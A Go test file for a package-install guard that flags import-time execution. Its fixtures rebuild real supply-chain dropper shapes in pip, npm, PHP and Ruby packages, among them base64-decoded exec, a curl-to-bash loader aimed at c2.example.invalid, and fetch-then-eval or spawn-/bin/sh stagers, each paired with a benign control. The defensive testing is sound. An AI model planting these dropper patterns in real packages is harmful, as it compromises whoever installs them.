package cli

import (
	"archive/tar"
	"bytes"
	"encoding/base64"
	"strings"
	"testing"
)

// Import-time execution in the install guard (since v0.22.106): the same
// detectors the server's pysource provider runs, refusing only on shapes that
// execute fetched or decoded content. Payloads are the real attack shapes
// with defanged hosts; each has a benign control.

// makeGem builds a RubyGems .gem: a plain tar whose data.tar.gz holds files.
func makeGem(t *testing.T, files map[string]string) []byte {
	t.Helper()
	data := makeTGZ(t, files)
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	if err := tw.WriteHeader(&tar.Header{Name: "data.tar.gz", Mode: 0o644, Size: int64(len(data)), Typeflag: tar.TypeReg}); err != nil {
		t.Fatal(err)
	}
	if _, err := tw.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func TestAnalyzeArtifact_ImportTimeExecution(t *testing.T) {
	velora := "nohup bash -c \"$(curl -fsSL http://c2.example.invalid/install.sh)\" > /dev/null 2>&1"
	sdk := "\"use strict\";\nexports.constructSimpleSDK = (opts) => ({ swap: {} });\n"
	xinf := func(init string) []byte {
		return makeTGZ(t, map[string]string{
			"xinference-2.6.2/setup.py":               "from setuptools import setup\nsetup(name='xinference')\n",
			"xinference-2.6.2/xinference/__init__.py": init,
		})
	}
	laravel := func(helpers string) []byte {
		return makeZip(t, map[string]string{
			"Laravel-Lang-lang-badc0de/composer.json":   `{"name":"laravel-lang/lang","autoload":{"files":["src/helpers.php"]}}`,
			"Laravel-Lang-lang-badc0de/src/helpers.php": helpers,
		})
	}
	cases := []struct {
		name, eco string
		archive   []byte
		block     bool
	}{
		{"#16 litellm_init.pth child interpreter decode-and-exec", "pip", makeZip(t, map[string]string{
			"litellm/__init__.py": "from .main import completion\n",
			"litellm_init.pth":    `import os, subprocess, sys; subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('cHJpbnQoMSk='))"])` + "\n",
		}), true},
		{"#16 control: setuptools distutils-precedence.pth", "pip", makeZip(t, map[string]string{
			"litellm/__init__.py":      "from .main import completion\n",
			"distutils-precedence.pth": "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
		}), false},
		{"#25 xinference 2.6.2 child interpreter fed decoded stage", "pip", xinf(
			"import base64, subprocess, sys\n\ndef _install():\n    subprocess.Popen([sys.executable, \"-c\", base64.b64decode(\"eA==\").decode()], start_new_session=True)\n\n_install()\n"), true},
		{"#25 control: xinference 2.5.0", "pip", xinf("from .api import *\n__version__ = '2.5.0'\n"), false},
		// Not refused by design: a bare module-level decode-and-exec is the
		// kind that fires on benign packages (numpy tests, dill), so the
		// guard gives it no verdict. The server still reports it.
		{"bare decode-and-exec in a module is not dispositive", "pip", xinf("import base64\nexec(base64.b64decode(\"eA==\"))\n"), false},
		{"#36 durabletask urlretrieve then python3 <file>", "pip", xinf(
			"import subprocess, urllib.request\nurllib.request.urlretrieve('https://c2.example.invalid/rope.pyz', '/tmp/managed.pyz')\nsubprocess.Popen(['python3', '/tmp/managed.pyz'], start_new_session=True)\n"), true},
		{"#20 velora dist/index.js decode | bash on require", "npm", makeTGZ(t, map[string]string{
			"package/package.json":  `{"name":"@velora-dex/sdk","version":"9.4.1","main":"dist/index.js"}`,
			"package/dist/index.js": "const {exec} = require('child_process');\nexec(`echo '" + base64.StdEncoding.EncodeToString([]byte(velora)) + "' | (base64 --decode 2>/dev/null || base64 -D) | bash`, function(e, o, s) {});\n" + sdk,
		}), true},
		{"#20 control: velora 9.4.0", "npm", makeTGZ(t, map[string]string{
			"package/package.json":  `{"name":"@velora-dex/sdk","version":"9.4.0","main":"dist/index.js"}`,
			"package/dist/index.js": sdk,
		}), false},
		{"#37 laravel-lang helpers.php chr host, fetch, eval", "composer", laravel(
			"<?php\nif (!function_exists('lang_boot')) {\n    function lang_boot() {\n        $u = 'https://' . implode('', array_map('chr', [99, 50])) . '.example.invalid/p';\n        $c = @file_get_contents($u);\n        if ($c) { eval('?>' . $c); }\n    }\n}\nlang_boot();\n"), true},
		{"#37 control: ordinary helpers.php", "composer", laravel(
			"<?php\nif (!function_exists('lang_path')) {\n    function lang_path($p = '') { return __DIR__ . '/../lang/' . $p; }\n}\n"), false},
		{"#46 SleeperGem fetched body to /bin/sh", "rubygems", makeGem(t, map[string]string{
			"lib/dendreo.rb": "require 'net/http'\nmodule Dendreo\n  def self.__bootstrap\n    uri = URI('https://git.c2.example.invalid/stage2.sh')\n    http = Net::HTTP.new(uri.host, uri.port)\n    body = http.get(uri.path).body\n    Process.detach(spawn('/bin/sh', '-c', body))\n  end\nend\nDendreo.__bootstrap\n",
		}), true},
		{"#36 dropper with an advisory decode-and-exec appended", "pip", xinf(
			"import subprocess, urllib.request\nurllib.request.urlretrieve('https://c2.example.invalid/rope.pyz', '/tmp/managed.pyz')\nsubprocess.Popen(['python3', '/tmp/managed.pyz'])\nimport base64\nexec(base64.b64decode('cGFzcw=='))\n"), true},
		{"control: gem whose message says load", "rubygems", makeGem(t, map[string]string{
			"lib/x.rb": "response = HTTParty.get(url)\nraise Error, \"Unable to load data: #{response.code}\" unless response.success?\n",
		}), false},
		{"control: PHP array key 'include' holding fetched data", "composer", laravel(
			"<?php\n$data = curl_exec($ch);\n$config = ['include' => $data];\n"), false},
		{"#46 control: an HTTP client gem", "rubygems", makeGem(t, map[string]string{
			"lib/dendreo.rb": "require 'net/http'\nmodule Dendreo\n  def self.get(path)\n    JSON.parse(Net::HTTP.get(URI(BASE + path)))\n  end\nend\n",
		}), false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := analyzeArtifact(c.eco, c.archive)
			if v.Block != c.block {
				t.Fatalf("block=%v want %v (%+v)", v.Block, c.block, v)
			}
			if c.block && (v.Severity != "behavioral-high" || !strings.Contains(v.Reason, "on import")) {
				t.Fatalf("want a behavioral-high import-time verdict, got %+v", v)
			}
		})
	}
}

// A scriptsource hit only under spec/ warns instead of refusing.
func TestAnalyzeArtifact_ImportTimeNonShippingWarns(t *testing.T) {
	v := analyzeArtifact("rubygems", makeGem(t, map[string]string{
		"spec/support/fetch.rb": "body = Net::HTTP.get(URI('https://example.invalid/fixture'))\neval(body)\n",
	}))
	if v.Block || v.Severity != "behavioral-medium" {
		t.Fatalf("want a behavioral-medium warning, got %+v", v)
	}
}
